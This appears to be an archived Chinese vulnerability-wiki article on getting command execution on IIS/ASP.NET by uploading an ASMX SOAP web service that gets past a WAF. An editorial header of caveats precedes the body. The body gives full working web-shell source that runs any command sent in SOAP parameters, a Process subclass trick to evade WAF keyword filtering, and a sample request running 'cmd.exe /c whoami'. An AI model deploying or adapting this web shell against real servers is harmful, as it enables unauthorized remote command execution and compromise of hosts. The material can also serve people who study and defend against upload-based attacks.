---
source: "Mr-xn/Penetration_Testing_POC"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
title: "构建ASMX绕过限制WAF达到命令执行"
product: "ASP.NET ASMX上传链技巧"
record_type: "unknown"
document_type: "技术文章（细分类待核）"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
prerequisites: "无具体WAF产品版本且依赖已存在任意文件上传及ASMX执行映射"
side_effects: "原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96%E8%BD%AF%E4%BB%B6/%E6%9D%82%E9%A1%B9/%E6%9E%84%E5%BB%BAASMX%E7%BB%95%E8%BF%87%E9%99%90%E5%88%B6WAF%E8%BE%BE%E5%88%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.md"
archive_commit: "41940cb0038d09ca5aaddbe5bffb923e423d210f"
source_status: "missing"
source_note: "原始出处待补；仓库归档不等同原始披露"
id: "vw-28729e2869293697bd2c0be4"
entity_id: "ve-28729e2869293697bd2c0be4"
schema_version: "1"
---

# 构建ASMX绕过限制WAF达到命令执行

<!-- vulwiki-editorial-rebuild:system-misc -->
## 条目范围与校订

- 本文对象：ASP.NET ASMX上传链技巧
- 文献类型：技术文章（细分类待核）
- 版本、权限及部署边界：无具体WAF产品版本且依赖已存在任意文件上传及ASMX执行映射
- 核验状态：仅重建文本校订；未执行文中代码、PoC 或扫描，未把截图或转载声明记为本站复现

### 具体结论与待核项

以下为原归档的逐项勘误与证据缺口；可由文本确定的问题已在下文订正，仍缺来源的事实保持待核。

1. 无具体WAF产品版本且依赖已存在任意文件上传及ASMX执行映射
2. WebService命名空间特性放New_Process而实际Service未标，SOAPAction可能不匹配
3. e.Close在ReadToEnd前易关闭输出流，顺序读stdout/stderr有阻塞风险
4. 只有源码无成功响应
5. 应区分WAF特征绕过与根因上传缺陷并标落地脚本清理

### 操作风险

原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响

技术请求、代码与实验方法按原文保留；其中的破坏性动作仅限授权、可恢复的隔离环境。缺失代码、参数或版本事实不猜补。

### 来源追溯

- 原始披露 URL 未确认；既有归档来源标签保留，不能替代原始公告

### 归档技术正文

### 以下信息来自倾旋知识星球，在此做整理  

> 近日，在遇到一个WAF，目标服务器配置如下：  

> 1.ASP.NET  
> 2.IIS  
> 3.Windows  
> 4.X WAF  
> 5.不允许上传 ASP、ASPX、ASA、CER、....  
> 6.任意文件上传漏洞  
> 于是想到还有ASMX，构建SOAP接口，分享给大家以便留存  
> 另外，WAF还拦截“Process()”，于是在C#代码里，创建了一个子类继承Process父类，然后实例化：    


```
public class New_Process :Process
{
    public New_Process(string s)
    {
            
    }

}

Process e = new New_Process("something");
```

```
POST /UploadPath/User/201908221824334713.asmx HTTP/1.1
Host: example.com
Content-Type: text/xml; charset=utf-8
Content-Length: 363
SOAPAction: "http://payloads.online/Test"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <Test xmlns="http://payloads.online/">
      <Z1>cmd.exe</Z1>
      <Z2>/c whoami</Z2>
    </Test>
  </soap:Body>
</soap:Envelope>
```
---------------------------------------------------


```
<%@ WebService Language="C#" Class="Service" %>
using System;
using System.Web;
using System.IO;
using System.Net;
using System.Text;
using System.Data;
using System.Data.SqlClient;
using System.Collections.Generic;
using System.Diagnostics;
using System.Web.SessionState;
using System.Web.Services;
using System.Xml;
using System.Web.Services.Protocols;

[WebService(Namespace = "http://payloads.online/")]
[WebServiceBinding(ConformsTo = WsiProfiles.BasicProfile1_1)]

public class New_Process :Process
{
    public New_Process(string s)
    {
            
    }

}


public class Service : System.Web.Services.WebService
{
    public Service()
    {

    }

    [WebMethod]
    public string Test(string Z1,string Z2)
    {
        String R;

        ProcessStartInfo c = new ProcessStartInfo(Z1,Z2);
        Process e = new New_Process("something");
        StreamReader OT, ER;
        c.UseShellExecute = false;
        c.RedirectStandardOutput = true;
        c.RedirectStandardError = true;
        e.StartInfo = c;
        
        e.Start();
        OT = e.StandardOutput;
        ER = e.StandardError;
        e.Close();
        R = OT.ReadToEnd() + ER.ReadToEnd();
        HttpContext.Current.Response.Clear();
        HttpContext.Current.Response.Write("<?xml version=\"1.0\" encoding=\"utf-8\"?>");
        HttpContext.Current.Response.Write("<data>");
        HttpContext.Current.Response.Write("<![CDATA[");
        HttpContext.Current.Response.Write("\x2D\x3E\x7C");
        HttpContext.Current.Response.Write(R);
        HttpContext.Current.Response.Write("\x7C\x3C\x2D");
        HttpContext.Current.Response.Write("]]>");
        HttpContext.Current.Response.Write("</data>");
        HttpContext.Current.Response.End();
        return R;
    }
}
```


---

> 来源：Mr-xn/Penetration_Testing_POC
